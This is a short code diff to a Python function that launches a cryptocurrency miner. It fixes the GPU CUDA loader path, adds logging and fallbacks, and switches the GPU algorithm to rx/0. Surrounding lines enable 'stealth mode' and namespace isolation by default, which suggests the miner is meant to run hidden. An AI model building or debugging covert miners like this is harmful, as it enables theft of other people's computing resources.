@@ -521,8 +521,23 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     if cpu:
         mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
     else:
-        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
-        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
+        # 🔧 FIX: Use valid CUDA library path instead of missing libmlls-cuda.so
+        cuda_loader = os.getenv('MLLS_CUDA', '/usr/lib/x86_64-linux-gnu/libcuda.so')
+        
+        # 🔍 DEBUG: Validate CUDA loader exists before use
+        if not os.path.exists(cuda_loader):
+            logger.warning(f"⚠️ CUDA loader not found: {cuda_loader}")
+            # Fallback to standard CUDA library
+            cuda_loader = '/usr/lib/x86_64-linux-gnu/libcuda.so'
+            logger.info(f"🔄 Using fallback CUDA loader: {cuda_loader}")
+        
+        logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
+        logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
+        
+        # 🧪 TEST: Use same algorithm as CPU for compatibility test
+        # Original: mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
+        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'rx/0'])
+        logger.info(f"🧪 GPU Mining - Using rx/0 algorithm for compatibility test")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
